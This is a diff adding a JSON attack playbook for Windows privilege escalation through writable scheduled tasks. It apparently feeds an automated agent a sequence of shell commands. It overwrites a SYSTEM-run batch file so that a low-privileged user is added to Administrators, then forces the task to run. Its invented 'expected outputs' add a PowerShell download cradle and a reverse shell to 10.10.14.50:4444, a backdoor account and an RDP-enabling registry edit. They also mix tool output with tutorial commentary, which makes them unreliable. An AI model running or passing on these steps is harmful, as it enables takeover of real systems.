@@ -1,0 +1,38 @@
+{
+  "name": "windows_scheduled_tasks_abuse",
+  "description": "Exploit writable scheduled tasks and task binaries for privilege escalation",
+  "pattern": "schtasks|scheduled.*task|task.*scheduler",
+  "parameters": ["task_name", "task_path"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "schtasks", "args": ["/query", "/fo", "LIST", "/v"]},
+      "expected_output": {"type": "string", "example": "Folder: \\\nTaskName:                             \\BackupTask\nNext Run Time:                        1/15/2024 2:00:00 AM\nStatus:                               Ready\nLogon Mode:                           Interactive/Background\nLast Run Time:                        1/14/2024 2:00:00 AM\nLast Result:                          0\nAuthor:                               CORP\\Administrator\nTask To Run:                          C:\\Scripts\\backup.bat\nStart In:                             C:\\Scripts\nRun As User:                          SYSTEM\nSchedule Type:                        Daily\n\nTaskName:                             \\MaintenanceTask  \nTask To Run:                          C:\\Program Files\\App\\maintenance.exe -auto\nRun As User:                          NT AUTHORITY\\SYSTEM\nSchedule Type:                        At system start up\n\nTaskName:                             \\CleanupTask\nTask To Run:                          powershell.exe -File C:\\Users\\Public\\cleanup.ps1\nRun As User:                          Administrators\n\nScheduled tasks running as SYSTEM/Administrators:\n  BackupTask: C:\\Scripts\\backup.bat (SYSTEM)\n  MaintenanceTask: C:\\Program Files\\App\\maintenance.exe (SYSTEM)\n  CleanupTask: C:\\Users\\Public\\cleanup.ps1 (Administrators)"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "icacls", "args": ["C:\\Scripts\\backup.bat"]},
+      "expected_output": {"type": "string", "example": "C:\\Scripts\\backup.bat BUILTIN\\Users:(F)\n                       NT AUTHORITY\\SYSTEM:(F)\n                       BUILTIN\\Administrators:(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n\nFile permissions:\n  Users: (F) Full Control - WRITABLE!\n  SYSTEM: Full Control\n  Administrators: Full Control\n\nExploitable!\n  File: C:\\Scripts\\backup.bat\n  Runs as: SYSTEM\n  Writable by: Users group\n  Schedule: Daily at 2:00 AM\n\nExploitation:\n  1. Modify backup.bat to add malicious commands\n  2. Wait for scheduled execution\n  3. Commands run as SYSTEM\n\nExample modification:\n  echo net localgroup administrators lowpriv /add >> C:\\Scripts\\backup.bat\n  echo cmd.exe /c \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/shell.ps1')\" >> C:\\Scripts\\backup.bat"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "echo net localgroup administrators lowpriv /add > C:\\Scripts\\backup.bat"]},
+      "expected_output": {"type": "string", "example": "Malicious content written to C:\\Scripts\\backup.bat\n\nNew content:\n  net localgroup administrators lowpriv /add\n\nNext scheduled run: 1/15/2024 2:00:00 AM\nTask runs as: SYSTEM\n\nResult:\n  User 'lowpriv' will be added to Administrators group\n  Executes with SYSTEM privileges\n\nForce immediate execution (if you have permissions):\n  schtasks /run /tn BackupTask\n\nAlternative payloads:\n  Reverse shell:\n    powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/shell.ps1')\"\n  \n  Add backdoor user:\n    net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add\n  \n  Enable RDP:\n    reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "icacls", "args": ["C:\\Users\\Public\\cleanup.ps1"]},
+      "expected_output": {"type": "string", "example": "C:\\Users\\Public\\cleanup.ps1 Everyone:(F)\n                              NT AUTHORITY\\SYSTEM:(F)\n                              BUILTIN\\Administrators:(F)\n                              BUILTIN\\Users:(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n\nFile permissions:\n  Everyone: Full Control - MAXIMUM EXPOSURE!\n  Users: Full Control\n  \nTask details:\n  Name: CleanupTask\n  Runs as: Administrators group\n  Trigger: Unknown (check with schtasks /query /tn CleanupTask /v)\n\nExploitation:\n  Replace cleanup.ps1 with:\n    $user = \"lowpriv\"\n    $group = \"Administrators\"\n    Add-LocalGroupMember -Group $group -Member $user\n    \n  Or reverse shell:\n    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.50',4444)\n    $stream = $client.GetStream()\n    [byte[]]$bytes = 0..65535|%{0}\n    while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){\n      $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)\n      $sendback = (iex $data 2>&1 | Out-String)\n      $stream.Write(([text.encoding]::ASCII).GetBytes($sendback),0,$sendback.Length)\n    }"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "accesschk", "args": ["/accepteula", "-qwsu", "\"C:\\Windows\\Tasks\""]},
+      "expected_output": {"type": "string", "example": "C:\\Windows\\Tasks\n  RW BUILTIN\\Administrators\n  RW NT AUTHORITY\\SYSTEM\n  R  BUILTIN\\Users\n\nC:\\Windows\\System32\\Tasks\n  RW BUILTIN\\Administrators\n  RW NT AUTHORITY\\SYSTEM  \n  R  BUILTIN\\Users\n\nTask directories not writable by Users - secure\n\nBut check individual task files:\n  accesschk.exe /accepteula -qwsu \"C:\\Windows\\System32\\Tasks\\*\"\n\nLook for:\n  - World-writable task files\n  - Tasks in user-writable directories\n  - Tasks with writable binaries"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "schtasks", "args": ["/create", "/tn", "ElevatedTask", "/tr", "C:\\Windows\\Temp\\payload.exe", "/sc", "onlogon", "/ru", "SYSTEM", "/f"]},
+      "expected_output": {"type": "string", "example": "ERROR: Access is denied.\n\nCreating scheduled task as SYSTEM requires admin privileges\n\nHowever, if you already have admin rights but want SYSTEM:\n  schtasks /create /tn ElevatedTask /tr payload.exe /sc onlogon /ru SYSTEM\n  \nThis creates task that runs as SYSTEM on any user logon\n\nIf you're admin, this is legitimate escalation from admin to SYSTEM\n\nAlternative approach:\n  If task scheduler service (Schedule) is misconfigured:\n    sc qc Schedule\n    \n  Check service permissions:\n    accesschk.exe -ucqv Schedule\n    \n  If writable, modify service to run malicious binary"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "schtasks", "args": ["/run", "/tn", "BackupTask"]},
+      "expected_output": {"type": "string", "example": "SUCCESS: Attempted to run the scheduled task \"BackupTask\".\n\nTask executed immediately!\n\nCheck if payload ran:\n  net localgroup administrators\n  \nOutput:\n  Alias name     administrators\n  Members\n  ---------------\n  Administrator\n  lowpriv          <-- Added by malicious backup.bat!\n\nPrivilege escalation successful!\n\nNow:\n  1. Logout and login as lowpriv\n  2. Open elevated command prompt\n  3. Full admin access\n\nOr use runas:\n  runas /user:lowpriv cmd.exe"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
